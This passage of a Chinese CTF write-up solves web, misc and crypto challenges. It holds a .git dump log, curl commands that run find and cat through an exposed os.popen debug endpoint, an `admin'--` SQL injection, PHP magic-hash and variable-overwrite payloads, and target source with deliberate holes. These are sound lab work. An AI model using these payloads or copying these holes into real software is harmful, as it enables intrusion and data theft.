[-] Fetching http://110.42.112.160:37583/medjed/.git/description [200]
[-] http://110.42.112.160:37583/medjed/.gitignore responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/COMMIT_EDITMSG [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-update.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-commit.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/index [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/update.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/info/exclude [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/info/packs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-receive.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-push.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-rebase.sample [200]
[-] Finding refs/
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/FETCH_HEAD [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/ORIG_HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/info/refs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/config [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/HEAD [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/main [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/development [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/master [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/production [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/packed-refs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/stash [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/stash responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/master [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/production [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/stash [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/stash responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/development [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/pack/pack-e3e12fccf9c4a714e6cadc9045259bc64dcd7786.idx [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/pack/pack-e3e12fccf9c4a714e6cadc9045259bc64dcd7786.pack [200]
[-] Finding objects
[-] Fetching objects
[-] Running git checkout .
```

将 .git 传到主机然后检查：

![](https://img.halfcity.top/2026/11/10/8c816acb1f4f0b67ed14d34fc0f2825f.png)

```txt
flag{w3lc0me_t0_The_ph4nt0m_th13v35}
```

### 太棒了，我逐渐理解一切

进入主页：

![](https://img.halfcity.top/2026/11/10/f2108010f06677d6949f815edd7aa685.png)

可以捕获到不断地对 `http://110.42.112.160:22780/api/game/check` 的请求，其中有两个参数 hp 和 san。

尝试将 hp 和 san 改为 0：

```bash
❯ curl -X POST  http://110.42.112.160:22780/api/game/check --data '{"hp": 0, "san": 1000000000}'
{"end":"true","result":"dead"}

❯ curl -X POST  http://110.42.112.160:22780/api/game/check --data '{"hp": 100, "san": 0}'
{"end":"true","result":"truth","flag":"flag{W3LcOmE-T0-sparkCTf-web_Ch41L3NgE_34fe3}"}
```

可以看到当 san 归零后给出了 flag：

```txt
flag{W3LcOmE-T0-sparkCTf-web_Ch41L3NgE_34fe3}
```

### 小雷的 vibe coding 之旅 (1)

检查网站源码可以看到这条注释：

```html
<!--
  豆包：我太懂你这种感觉了！！我给你最直接、最真相、最不绕弯的话，你把管理页面设置在/xiaolei-adminbackend/绝对没有人能发现
-->
```

这里泄露了 admin 页面的路由：

![](https://img.halfcity.top/2026/11/10/4fca78714a06e564cebfd8950c4d54e3.png)

```html
<!--小雷：豆包说一般没人来我这后台，随便设置点密码算了，不然老是忘记 -->
```

再次注意到源码中的注释，猜测存在弱密码。

经测试凭据为：`admin / admin123`

来到管理页面：

![](https://img.halfcity.top/2026/11/10/f0c182462954aa4960609c8383faf276.png)

可以访问到一个假的 flag：

![](https://img.halfcity.top/2026/11/10/b0550a262bb354a6b471db249bffa988.png)

观察请求参数怀疑这里存在一个 LFI 漏洞，由于网站后端是 Flask，根据命名习惯猜测源码叫 `app.py`。

成功读取到文件：

```py
import os
import time
from datetime import datetime

from flask import (Flask, abort, jsonify, redirect, render_template,
                   request, send_file, session, url_for)

app = Flask(__name__)
app.secret_key = "xiaolei-v1be-c0d1ng-2026"

MAX_PREVIEW_BYTES = 2 * 1024 * 1024

USERS = {
    "admin": "admin123",
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_DIR = os.path.join(BASE_DIR, "files")


def logged_in():
    return session.get("user") in USERS


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/xiaolei-adminbackend/", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if USERS.get(username) == password:
            session["user"] = username
            return redirect(url_for("panel"))
        time.sleep(0.1)
        error = "用户名或密码错误！"
    return render_template("login.html", error=error)


@app.route("/xiaolei-adminbackend/panel")
def panel():
    if not logged_in():
        return redirect(url_for("admin_login"))
    files = sorted(os.listdir(FILE_DIR))
    return render_template("admin.html", files=files, user=session["user"])


def safe_path(name):
    if name.startswith("/") or "\\" in name or ":" in name:
        abort(400)
    if "proc" in name.lower():
        abort(403)
    return os.path.normpath(os.path.join(FILE_DIR, name))


def human_size(n):
    if n < 1024:
        return f"{n} B"
    for unit in ("KB", "MB", "GB"):
        n /= 1024
        if n < 1024:
            return f"{n:.1f} {unit}"
    return f"{n:.1f} GB"


def build_entries(abs_dir, base_rel, current=""):
    base_rel = base_rel.rstrip("/")
    try:
        items = sorted(os.listdir(abs_dir), key=str.lower)
    except PermissionError:
        return None
    entries = []
    for item in items:
        child_rel = f"{base_rel}/{item}" if base_rel else item
        abs_child = os.path.join(abs_dir, item)
        try:
            is_dir = os.path.isdir(abs_child)
            size_text = "" if is_dir else human_size(os.path.getsize(abs_child))
        except OSError:
            size_text = ""
        entries.append({
            "name": item,
            "href": url_for("download", file=child_rel),
            "is_dir": is_dir,
            "is_current": child_rel == current,
            "size_text": size_text,
        })
    return entries


@app.route("/xiaolei-adminbackend/download")
def download():
    if not logged_in():
        return redirect(url_for("admin_login"))

    name = request.args.get("file", "")
    # 文件列表固定显示 files/ 目录，不随输入的路径切换
    entries = build_entries(FILE_DIR, "", current=name)

    if not name:
        return render_template("files.html", cur="", entries=entries,
                               is_view=False, user=session["user"])

    path = safe_path(name)

    if not os.path.isfile(path):
        if os.path.isdir(path):
            return render_template("files.html", cur=name, entries=entries,
                                   is_view=False, user=session["user"])
        abort(404)

    if request.args.get("raw") == "1":
        return send_file(path, as_attachment=True)

    try:
        size_text = human_size(os.path.getsize(path))
        mtime_text = datetime.fromtimestamp(
            os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M:%S")
    except OSError:
        size_text = mtime_text = "未知"

    content = None
    read_error = ""
    try:
        with open(path, "rb") as f:
            data = f.read(MAX_PREVIEW_BYTES + 1)
        truncated = len(data) > MAX_PREVIEW_BYTES
        data = data[:MAX_PREVIEW_BYTES]
        if b"\x00" in data:
            read_error = "二进制文件不支持文本预览，请下载后查看"
        else:
            content = data.decode("utf-8", errors="replace")
    except PermissionError:
        truncated = False
        read_error = "没有权限读取该文件"

    return render_template(
        "files.html",
        cur=name,
        entries=entries,
        is_view=True,
        size_text=size_text,
        mtime_text=mtime_text,
        truncated=truncated,
        content=content,
        read_error=read_error,
        raw_href=url_for("download", file=name, raw=1),
        user=session["user"],
    )


@app.route("/xiaolei-adminbackend/xiaolei-debug", methods=["POST"])
def dev_console():
    data = request.get_json(silent=True)
    if not data or "cmd" not in data:
        return jsonify({"error": "missing cmd"}), 400

    cmd = data["cmd"]
    output = os.popen(cmd).read() or "(no output)"
    return jsonify({"cmd": cmd, "output": output})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

注意到这里暴露了一个调试接口允许 RCE：

```py
@app.route("/xiaolei-adminbackend/xiaolei-debug", methods=["POST"])
def dev_console():
    data = request.get_json(silent=True)
    if not data or "cmd" not in data:
        return jsonify({"error": "missing cmd"}), 400

    cmd = data["cmd"]
    output = os.popen(cmd).read() or "(no output)"
    return jsonify({"cmd": cmd, "output": output})
```

我们尝试找一下 flag：

```bash
❯ curl http://110.42.112.160:42423/xiaolei-adminbackend/xiaolei-debug -X POST --data '{"cmd": "find / -name flag* -type f 2>/dev/null"}' --header "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.arp1ng.XoIdWKZOFtItiwvZrB0eQUdua_w" -H "Content-Type: application/json"|jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    574 100    525 100     49    709     66                              0
{
  "cmd": "find / -name flag* -type f 2>/dev/null",
  "output": "/sys/devices/pnp0/00:02/00:02:0/00:02:0.0/tty/ttyS0/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags\n/sys/devices/pci0000:00/0000:00:1f.0/IPI0001:00/flag_fetches\n/sys/devices/virtual/net/eth0/flags\n/sys/devices/virtual/net/lo/flags\n/flag_8d321ee7\n/app/files/flag.txt\n"
}
```

这里可以看到真正的 flag 的位置 `/flag_8d321ee7`。

直接读取即可：

```bash
❯ curl http://110.42.112.160:42423/xiaolei-adminbackend/xiaolei-debug -X POST --data '{"cmd": "cat /flag_8d321ee7"}' --header "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.arp1ng.XoIdWKZOFtItiwvZrB0eQUdua_w" -H "Content-Type: application/json"|jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    117 100     88 100     29    566    186                              0
{
  "cmd": "cat /flag_8d321ee7",
  "output": "flag{4uTO-0PtiM1Z1Ng_5OlutloN_lNNoVAtlOn3bfa}\n"
}
```

```txt
flag{4uTO-0PtiM1Z1Ng_5OlutloN_lNNoVAtlOn3bfa}
```

### 还有谁想当管理员

网站提供了后端的源码：

```py
import os
import sqlite3
from flask import Flask, request, redirect, session, render_template

app = Flask(__name__)
# 每次启动随机生成会话密钥，防止从 /source 看到密钥后伪造 session 绕过登录（非预期解）
app.secret_key = os.urandom(32).hex()
FLAG = os.environ.get('FLAG', 'flag{please_change_this_flag}')

DB_PATH = 'ctf.db'


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DROP TABLE IF EXISTS users')
    c.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    # 密码是随机生成的，想爆破吗？别逗你佩姐笑了。
    random_pwd = os.urandom(4).hex()
    c.execute("INSERT INTO users (username, password) VALUES ('admin', ?)", (random_pwd,))
    conn.commit()
    conn.close()


init_db()


@app.route('/')
def index():
    return render_template('login.html')


@app.route('/source')
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        code = f.read()
    return render_template('source.html', code=code)


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # 危险写法：直接拼接 SQL，这就是 SQL 注入的根源
    sql = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (username, password)

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute(sql)
        user = c.fetchone()
    except Exception as e:
        conn.close()
        return render_template(
            'status.html',
            kicker='QUERY ERROR · DEBUG OUTPUT',
            headline='SQL 语句执行出错（方便你调试）',
            err=str(e),
        )
    conn.close()

    if user:
        session['user'] = user[1]
        return redirect('/flag')
    return render_template(
        'status.html',
        kicker='AUTH FAILED',
        headline='用户名或密码错误',
        msg='该账号不存在，或密码不正确。请再试一次，或者翻翻源代码。',
    )


@app.route('/flag')
def show_flag():
    if session.get('user') == 'admin':
        return render_template(
            'status.html',
            kicker='ACCESS GRANTED · FLAG DELIVERED',
            headline='登录成功，欢迎回来 管理员！',
            flag=FLAG,
        )
    return render_template(
        'status.html',
        kicker='ACCESS DENIED · 403',
        headline='你不是 admin，flag 不给你',
        msg='仅 admin 会话可读取 /flag。',
    ), 403


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8086)
```

注意到这里存在明显的 SQL 注入，很简单就可以绕过认证。

这里用户名输入 `admin'--` 密码任意，拼接出来的 SQL 语句就是：

```sql
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
```

登录即可获取 flag：

![](https://img.halfcity.top/2026/11/10/86da772873a75c2871f910e69cf3e64e.png)

```txt
flag{ec5a2ba8-73e1-5361-3da7-fb1396649b43}
```

### 废弃的网站

根据提示打开 `robots.txt` 文件，这里泄露了两个路由：

```txt
User-agent: *
Disallow: /legacy-note.txt
Disallow: /assets/drafts/
```

```txt title="legacy-note.txt"
Legacy migration checklist
==========================

[OK] Blog frontend migrated
[OK] Database snapshot archived
[OK] Static resources migrated
[!] Legacy administrator console still available

Temporary path:
/old-admin/login.php

TODO:
Replace the old MD5 token verification code.
PHP really should stop guessing types for us.
```

#### Track 1

进入 `/old-admin/login.php` 这里路由以后得到了 `login.php` 的源码：

```php
<?php
session_start();
error_reporting(0);

$token = $_GET['token'] ?? '';

if ($token !== '') {
    if (
        is_string($token)
        && $token !== 'QNKCDZO'
        && md5($token) == '0e830400451993494058024219903391'
    ) {
        $_SESSION['stage2'] = true;
        header('Location: panel.php');
        exit;
    }

    $message = 'Token rejected.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

在 PHP 中，== 比较两个字符串时，如果两个字符串都是数字字符串，就会把它们转换成数字再比较。

右侧 `0e830400451993494058024219903391` 是 0e 开头，后面全是数字，在 PHP 中会被解析为科学计数法 `0 × 10^830400...` 也就是数字 0。

所以，只要 md5($token) 的结果也是 0e 后跟纯数字，那么在 == 比较时也会被当成 0，从而与右侧相等。

240610708 的 md5 值为 0e462097431906509019562988736854。

我们只需要这样访问路由即可 `/old-admin/login.php?token=240610708`。

#### Track 2

这里得到了第二份源码：

```php
<?php
session_start();
error_reporting(0);

$authorized = !empty($_SESSION['stage2']);

if (!$authorized) {
    http_response_code(403);
}

$role = 'reader';
$profile = $_GET['profile'] ?? null;

if (is_array($profile)) {
    foreach ($profile as $name => $value) {
        if (is_string($name) && is_string($value)) {
            $$name = $value;
        }
    }
}

if ($authorized && $role === 'archivist') {
    $_SESSION['stage3'] = true;
    header('Location: archive.php');
    exit;
}

if ($authorized && $profile !== null) {
    $message = 'Your profile does not have archive privileges.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

注意到这里 `$$name = $value;`，代码中存在变量覆盖的语法，这允许我们将自定义的值赋值给先前定义的变量。

payload如下：

```txt
old-admin/panel.php?profile[role]=archivist
```

#### Track 3

这样我们就可以得到第三份源码：

```php
<?php
session_start();
error_reporting(0);

$authorized = !empty($_SESSION['stage3']);

if (!$authorized) {
    http_response_code(403);
}

$key = $_GET['key'] ?? '';
$valid = false;

if (is_string($key) && strlen($key) === 12) {
    $archiveRun = strspn($key, 'ARCHIVE');
    $numberOffset = strcspn($key, '0123456789');
    $numberRun = strspn($key, '0123456789', $numberOffset);
    $labelRun = strspn($key, 'abcdefghijklmnopqrstuvwxyz', $numberOffset + $numberRun);

    $valid = $archiveRun === 5
        && $numberOffset === 5
        && $numberRun === 3
        && $labelRun === 4;
}

if ($authorized && $valid) {
    $flag = trim((string) file_get_contents('/flag'));
} elseif ($authorized && $key !== '') {
    $message = 'Archive key format mismatch.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

这里对传入的 key 参数提出要求：

- 总长度 12
- 前 5 个字符都必须是 'ARCHIVE' 中的字符
- 第 6 个字符开始是数字，连续 3 个数字
- 第 9 个字符开始是 4 个小写字母
- 长度正好 5 + 3 + 4 = 12

z3 约束求解即可：

```py
from z3 import *

s = [Int(f'c{i}') for i in range(12)]
solver = Solver()

for i in range(5):
    solver.add(Or([s[i] == ord(c) for c in 'ARCHIVE']))

for i in range(5, 8):
    solver.add(s[i] >= ord('0'), s[i] <= ord('9'))

for i in range(8, 12):
    solver.add(s[i] >= ord('a'), s[i] <= ord('z'))

solver.add(Not(Or([s[5] == ord(c) for c in 'ARCHIVE'])))

for i in range(5):
    solver.add(Not(And(s[i] >= ord('0'), s[i] <= ord('9'))))

for i in range(5, 8):
    solver.add(And(s[i] >= ord('0'), s[i] <= ord('9')))
solver.add(Not(And(s[8] >= ord('0'), s[8] <= ord('9'))))

for i in range(8, 12):
    solver.add(And(s[i] >= ord('a'), s[i] <= ord('z')))

if solver.check() == sat:
    m = solver.model()
    result = ''.join(chr(m.eval(s[i]).as_long()) for i in range(12))
    print("key:", result)
else:
    print("no solution")
```

很快就得到一个解：

```bat
> python solve.py
key: AAAAA000aaa
```

payload 如下：

```txt
/old-admin/archive.php?key=AAAAA000aaa
```

![](https://img.halfcity.top/2026/11/10/904f4a2f6dcd3fe157ea798f46aea2b0.png)

```txt
flag{@uTo_5CAIlnG_C@chE-dEpL0ym3NT2a87a57}
```

## Misc

### AEGIS-TRACE

`agent.log` 文件中这一条日志很奇怪，似乎 AP 模块创建了一个程序内内存转储，`data` 中包含了一段使用 base32 编码的数据：

```txt
14:28:17.827 [autopilot] trace=fa157fd07224d1e4 Agent response channel=artifact name=snapshot_blob codec=b32 data=...
```

后续发现数据是 Base 套娃，最后可以获取到一个图片：

![](https://img.halfcity.top/2026/11/10/9fb4365227accc02777caae8f6b56300.png)

![](https://img.halfcity.top/2026/11/10/49727808136fcf02802045835faf1f97.png)

![](https://img.halfcity.top/2026/11/10/6ebaa22864fcaa302d0021f4f35a6729.png)

![](https://img.halfcity.top/2026/11/10/28d978f4cec36b8eaf09baa1ac9d1f5b.png)

```txt
flag{h3nry_13ph7_7h3_$1gn41}
```

### FLAG 怪盗团·番外

```txt
++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<++.<<<+.>.>>>+++++++.---.<<<<++.>>>>+++++++.<----.>>----.<---------.<<<<--.>>>>+++.<.>++.<<<<++.>>>>>-.<<++++++.>++++.<------.>-------.+++.<<<<---.>>>>>+.<<.>>---.<------.<<<<++++.>>>.>--.>+.-------.<<.<<<----.>>>>.<.<<+++.>++++.<+++.>>>>+++++++++++++++.
```

题目给了一段密文，明显是 brainfuck。

解密得到 flag：

```txt
flag{c1@nk3r_wi1l_n3ver_kn0w_th4_fun_0f_CTF}
```

### MISSION 01 「为了世界和平，组建家庭吧」

```bash
❯ zsteg photo.png
b1,r,lsb,xy         .. text: "PHOtO_hiDES_53cre7s_"
b1,g,msb,xy         .. file: OpenPGP Secret Key
b1,b,lsb,xy         .. text: "cOlOr_P1ANe5}"
b1,b,msb,xy         .. file: OpenPGP Public Key
b4,g,lsb,xy         .. file: AIX core file 64-bit
```

猜测是 LSB 隐写。

使用工具手动提取

在 RBG 通道分别提取出了 `PHOtO_hiDES_53cre7s_` `in_@l1_` `cOlOr_P1ANe5}`

![](https://img.halfcity.top/2026/11/10/261a9f80f387189761a2d85e8ec52597.png)

最后在 a 通道提取出的图片有 flag 的头部。

```txt
flag{foRgeR_fAmily_PHOtO_hiDES_53cre7s_in_@l1_cOlOr_P1ANe5}
```

### MISSION 02 「被搅乱的入学证件照」

得到一张看起来比较有序但是混乱的图片。

猜测是猫脸变换。

检查一下图片的 exif 信息：

```bash
❯ exiftool attachment.png
ExifTool Version Number         : 13.50
File Name                       : attachment.png
Directory                       : .
File Size                       : 1044 kB
File Modification Date/Time     : 2026:09:28 12:41:34-04:00
File Access Date/Time           : 2026:09:29 00:55:54-04:00
File Inode Change Date/Time     : 2026:09:29 00:55:53-04:00
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 850
Image Height                    : 850
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
User Comment                    : 猜你想要：(7_,7_,7_)
Image Size                      : 850x850
Megapixels                      : 0.723
```

这里有一个提示，`(7_,7_,7_)`，这应该就是 a, b, c这三个参数的提示，样本空间为 1000。

这个大小的爆破是完全可以接受的。

爆破出来的图片肉眼看一下即可。

这里我使用[这个工具](https://github.com/Alexander17-yang/Anrold-break)进行爆破。

最后得到的参数如下：

```txt
C = 71, A = 73, B = 76
```

![](https://img.halfcity.top/2026/11/10/c518614f1172123c325272b962202846.png)

```txt
flag{Shuffle_The_Pixels_Enough_Times_And_The_Cat_Will_Come_Back}
```

### OSINT之旅1

根据图片可以提取出两个关键词 `trasimeno` 和 `kitemaffia`。

我们可以在谷歌地图中找到这个地方以及旁边的湖：

![](https://img.halfcity.top/2026/11/10/c10027a1e5ecf0a49e40c61fc570e2be.png)

```txt
flag{italy_lago_trasimeno_lake_43.1_12.0}
```

### 惊鸿一瞥

压缩包内的题目描述：

```txt
奶娃本来要拿这张图片去找女神表白，但是粗心的他，竟然忘记了密码，请你帮他找到最后藏在图片背后的秘密。
本题由Steghide加密，加密密码是弱密码，你得找找有什么自动化工具破解密码，才能提取隐藏在图片背后的秘密。
所有需要密码的文件，其解密需要的密码都是弱密码，加油，相信你一定能做到，弱密码来自著名的字典rockyou.txt，你在github上就能发现。
```

另外还有一张奶龙的图片。

```bash
❯ stegseek challenge/challenge_qingshu.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "iloveyou"
[i] Original filename: "flag.zip".
[i] Extracting to "challenge_qingshu.jpg.out".
```

得到密码和压缩包，使用同样的密码可以解压出 flag.txt 文件，内容如下：

```txt
RzAwZF9qMGJfeTB1LWhhdmVfa25vd2VkX2Jhc2U2NF9kZWMwZGluZwpIZXJlX2lzX3lvdXJfZ2lmdCEKZmxhZ3tDMG5ncmF0dWxhdGlvbnNfMG5fcGFzc2luZ190aGVfY2hhbGxlbmdlISEhfQ==
```

base64 解码一下：

```bash
❯ cat flag.txt|base64 -d
G00d_j0b_y0u-have_knowed_base64_dec0ding
Here_is_your_gift!
flag{C0ngratulations_0n_passing_the_challenge!!!}
```

```txt
flag{C0ngratulations_0n_passing_the_challenge!!!}
```

## Crypto

### Crypto环境入门小指南

sagemath 环境配置很麻烦，所以我选择邪修。

给出的附件中解密的逻辑很简单，我们直接自己写一份即可：

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes
import hashlib

R_list = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]
U_list = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]

seed = long_to_bytes(469363989283007642881690653979669103)
seed = seed.decode() + "|{}|{}".format(
    ",".join(str(x) for x in R_list),
    ",".join(str(x) for x in U_list),
)

key = hashlib.sha256(seed.encode()).digest()
iv = bytes.fromhex("536167654d61746831302e332057534c")
ciphertext = bytes.fromhex("8233e02bf1dfc9302c613736fd8a6392067ec74b6b395241786cda4412b6f857")

flag = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16).decode()
print(flag)
```

运行即可得到 flag：

```txt
flag{s@g3m@th_i5_us3fu1!}
```

### PRNG_1

```py
from Crypto.Util.number import *

flag=b'???'

a=getPrime(512)
b=getPrime(512)
n=getPrime(512)

assert len(bin(bytes_to_long(flag))[2:]) < 512
assert a < n and b < n and GCD(a, n) == 1

output=[bytes_to_long(flag)]
